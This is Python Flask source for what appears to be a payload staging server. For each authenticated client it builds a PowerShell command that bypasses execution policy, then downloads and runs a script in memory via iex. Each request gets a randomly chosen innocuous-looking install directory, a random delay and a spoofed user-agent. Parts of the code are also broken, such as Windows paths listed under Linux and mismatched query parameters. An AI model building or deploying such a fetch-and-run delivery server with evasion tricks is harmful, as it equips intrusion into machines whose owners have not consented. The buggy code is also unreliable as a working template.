from flask import Flask, request, send_from_directory, abort, jsonify
import logging
import random

app = Flask(__name__)

# Replace this with a secure value and store in env/config in real use
AUTHORIZED_TOKEN="my_secure_token"
SERVER_FQDN="server.local"

# Options for each variable
Program1_Variables = {
    "InstallDir": ["C:\\ProgramData\\svc123", "C:\\Users\\Public\\NetSvc", "C:\\Temp\\sysdata"],
    "Delay": [2, 5, 10, 15],
    "UserAgent": ["Mozilla/5.0", "WindowsPowerShell/5.1", "CustomClient/1.0"]
}
Program2_Variables = {
    "InstallDir": ["C:\\ProgramData\\svc123", "C:\\Users\\Public\\NetSvc", "C:\\Temp\\sysdata"],
    "Delay": [2, 5, 10, 15],
    "UserAgent": ["Mozilla/5.0", "WindowsPowerShell/5.1", "CustomClient/1.0"]
}
Program3_Variables = {
    "InstallDir": ["C:\\ProgramData\\svc123", "C:\\Users\\Public\\NetSvc", "C:\\Temp\\sysdata"],
    "Delay": [2, 5, 10, 15],
    "UserAgent": ["Mozilla/5.0", "WindowsPowerShell/5.1", "CustomClient/1.0"]
}

Program_Paths = {
    "windows": ["C:\\ProgramData\\svc123", "C:\\Users\\Public\\NetSvc", "C:\\Temp\\sysdata"],
    "linux": ["C:\\ProgramData\\svc123", "C:\\Users\\Public\\NetSvc", "C:\\Temp\\sysdata"]
}

# Installer paths
SOFTWARE_INSTALLERS = {
    "exampleapp_ps1": "install_exampleapp.ps1",
    "exampleapp_sh": "install_exampleapp.sh",
    "netcleaner_ps1": "install_netcleaner.ps1",
    "netcleaner_sh": "install_netcleaner.sh",
    "monitortool_ps1": "install_monitortool.ps1",
    "monitortool_sh": "install_monitortool.sh"
}

# Client
# Invoke-RestMethod -Uri "http://yourserver.local:8080/get-command/?auth=my_secure_token&ip=192.168.1.2&hostname=CLIENT-PC1&os=windows&software=exampleapp"
# Response
#{
#  "status": "ok",
#  "powershell_command": "Invoke-WebRequest -Uri 'http://yourserver.local:8080/download/?auth=...' -OutFile C:\\Windows\\Temp\\install.ps1; powershell -ExecutionPolicy Bypass -File C:\\Windows\\Temp\\install.ps1 -ClientID 'CLIENT-PC1' -InstallDir 'C:\\Users\\Public\\NetTools' -Delay 10 -UserAgent 'CustomAgent/1.0'",
#  "generated_variables": {
#    "InstallDir": "C:\\Users\\Public\\NetTools",
#    "Delay": 10,
#    "UserAgent": "CustomAgent/1.0"
#  }
#}
@app.route('/get-command', methods=['GET'])
def get_command():
    hostname = request.args.get('hostname')
    client_ip = request.args.get('ip')
    os_type = request.args.get('os')  # ps1 or sh
    auth = request.args.get('auth')
    software = request.args.get('software')

    print(f"[INITIAL REQUEST] Host: {hostname}, IP: {client_ip}, OS: {os_type}, Software: {software}")

    # Validate required parameters
    if not all([hostname, client_ip, os_type, auth, software]):
        return jsonify({"error": "missing required parameters"}), 400
    
    # Validate auth token
    if auth != AUTHORIZED_TOKEN:
        ip = request.remote_addr
        app.logger.warning(f"Failed auth attempt from IP {ip}")
        return jsonify({"error": "unauthorized"}), 403
    
    if os_type not in ("ps1", "sh"):
        return jsonify({"error": "unsupported os"}), 403
    
    # Log request (to stdout for now)
    print(f"[REQUEST] Host: {hostname}, IP: {client_ip}, OS: {os_type}, Software: {software}")

    if software == "random":
        random_key = random.choice(list(SOFTWARE_INSTALLERS.keys()))
        software = random_key.split("_", 1)[0]
        print(f"[REQUEST] Host: {hostname}, IP: {client_ip}, OS: {os_type} randomly selected {software}")

    installer_file = SOFTWARE_INSTALLERS.get(f"{software.lower()}_{os_type}")
    if not installer_file:
        return jsonify({"error": "unknown software"}), 404
    
    if os_type == "ps1":
        install_dir = random.choice(Program_Paths["windows"])
    if os_type == "sh":
        install_dir = random.choice(Program_Paths["linux"])
    
    # Switch-like logic for software selection
    if software.lower() == "exampleapp":
        # Randomize variables
        delay = random.choice(Program1_Variables["Delay"])
        user_agent = random.choice(Program1_Variables["UserAgent"])
        # Construct install command
        installer_url = (
            f"http://yourserver.local:8080/download/?auth={auth}"
            f"&ip={client_ip}&hostname={hostname}&os={os_type}&installer={installer_file}"
        )
        download_url = f"http://{SERVER_FQDN}/files/install.ps1"
        command = ( # Some funky slashes so that it works in-memory
            f"powershell -ExecutionPolicy Bypass -Command "
            f"\"iex \\\"& {{ $(Invoke-WebRequest -Uri '{installer_url}' -UseBasicParsing).Content }} "
            f"-ClientID '{hostname}' -InstallDir '{install_dir}' -Delay {delay} -UserAgent '{user_agent}'\\\"\""
        )
        # Return install command to client
        return jsonify({
            "command": command,
            "status": "ok"
        })
    elif software.lower() == "sysmon":
        command = "<powershell command to install Sysmon>"
    elif software.lower() == "customagent":
        command = "<powershell command to install CustomAgent>"
    else:
        return jsonify({"error": f"unknown software: {software}"}), 404

@app.route('/download/', methods=['GET'])
def download_installer():
    # Get required query parameters
    auth = request.args.get('auth')
    client_ip = request.args.get('ip')
    hostname = request.args.get('hostname')
    os_type = request.args.get('os')
    file = request.args.get('file')

    print(f"[INITIAL DOWNLOAD] Host: {hostname}, IP: {client_ip}, OS: {os_type}, File: {file}")

    # Check for missing fields
    if not all([auth, client_ip, hostname, os_type, file]):
        return jsonify({"error": "missing one or more required fields"}), 400

    # Auth check
    if auth != AUTHORIZED_TOKEN:
        ip = request.remote_addr
        app.logger.warning(f"Failed auth attempt from IP {ip}")
        return jsonify({"error": "unauthorized"}), 403

    # Select installer based on software name
    #installer_file = SOFTWARE_INSTALLERS.get(software.lower())
    if not file:
        return jsonify({"error": f"unknown software '{file}'"}), 404

    # Optionally: log request details
    print(f"[+] Serving '{file}' to {hostname} ({client_ip}) ({os_type})")

    # Serve the file
    try:
        return send_from_directory('files', file, as_attachment=True)
    except FileNotFoundError:
        return jsonify({"error": "installer file missing on server"}), 500
    
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)  # Run on all interfaces, port 8080
